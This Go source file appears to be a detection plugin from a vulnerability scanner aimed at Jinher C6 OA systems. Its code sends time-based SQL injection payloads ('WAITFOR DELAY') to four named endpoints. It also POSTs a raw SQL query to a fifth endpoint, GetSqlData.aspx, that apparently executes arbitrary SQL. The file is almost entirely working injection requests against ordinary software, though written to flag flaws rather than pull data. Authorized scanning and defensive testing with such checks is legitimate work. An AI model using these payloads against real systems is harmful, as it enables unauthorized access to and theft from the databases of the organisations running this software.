package jinher

import (
	"fmt"
	"strings"
	"time"

	"github.com/youki992/VscanPlus/pkg"
)

func Check(url string) bool {
	startTime := time.Now()
	if req, err := pkg.HttpRequset(url+"/c6/jhsoft.mobileapp/AndroidSevices/HomeService.asmx/GetHomeInfo?userID=1';WAITFOR+DELAY+'0:0:5'--", "GET", "", false, nil); err == nil {
		if strings.Contains(req.Body, "Sex") {
			// 请求成功，计算响应时间
			endTime := time.Now()
			responseTime := endTime.Sub(startTime)
			// 判断响应时间是否超过5秒
			if responseTime.Seconds() >= 5 {
				pkg.GoPocLog(fmt.Sprintf("Found vuln SQL_injection|%s\n", url+"/c6/jhsoft.mobileapp/AndroidSevices/HomeService.asmx/GetHomeInfo?userID=1';WAITFOR+DELAY+'0:0:5'--"))
				return true
			}
		}
	}
	startTime_One := time.Now()
	if req, err := pkg.HttpRequset(url+"/C6/JHSoft.Web.IncentivePlan/IncentivePlanFulfill.aspx/?IncentiveID=1%20WAITFOR%20DELAY%20'0:0:5'--&TVersion=1", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 {
			// 请求成功，计算响应时间
			endTime := time.Now()
			responseTime := endTime.Sub(startTime_One)
			// 判断响应时间是否超过5秒
			if responseTime.Seconds() >= 5 {
				pkg.GoPocLog(fmt.Sprintf("Found vuln SQL_injection|%s\n", url+"/C6/JHSoft.Web.IncentivePlan/IncentivePlanFulfill.aspx/?IncentiveID=1%20WAITFOR%20DELAY%20'0:0:5'--&TVersion=1"))
				return true
			}
		}
	}
	startTime_Two := time.Now()
	if req, err := pkg.HttpRequset(url+"/C6/JHSoft.Web.WorkFlat/RssModulesHttp.aspx/?interfaceID=-1;WAITFOR+DELAY+%270:0:5%27--", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 {
			// 请求成功，计算响应时间
			endTime := time.Now()
			responseTime := endTime.Sub(startTime_Two)
			// 判断响应时间是否超过5秒
			if responseTime.Seconds() >= 5 {
				pkg.GoPocLog(fmt.Sprintf("Found vuln SQL_injection|%s\n", url+"/C6/JHSoft.Web.WorkFlat/RssModulesHttp.aspx/?interfaceID=-1;WAITFOR+DELAY+%270:0:5%27--"))
				return true
			}
		}
	}
	startTime_Three := time.Now()
	if req, err := pkg.HttpRequset(url+"/C6/Jhsoft.Web.users/GetTreeDate.aspx/?id=1;WAITFOR+DELAY+'0:0:5'--", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 {
			// 请求成功，计算响应时间
			endTime := time.Now()
			responseTime := endTime.Sub(startTime_Three)
			// 判断响应时间是否超过5秒
			if responseTime.Seconds() >= 5 {
				pkg.GoPocLog(fmt.Sprintf("Found vuln SQL_injection|%s\n", url+"/C6/Jhsoft.Web.users/GetTreeDate.aspx/?id=1;WAITFOR+DELAY+'0:0:5'--"))
				return true
			}
		}
	}
	if req, err := pkg.HttpRequset(url+"/C6/Control/GetSqlData.aspx/.ashx", "POST", "select @@version", false, nil); err == nil {
		if req.StatusCode == 200 && strings.Contains(req.Body, "ColumnName") {
			pkg.GoPocLog(fmt.Sprintf("Found vuln SQL_injection|%s\n", url+"/C6/Control/GetSqlData.aspx/.ashx"))
			return true
		}
	}
	return false
}
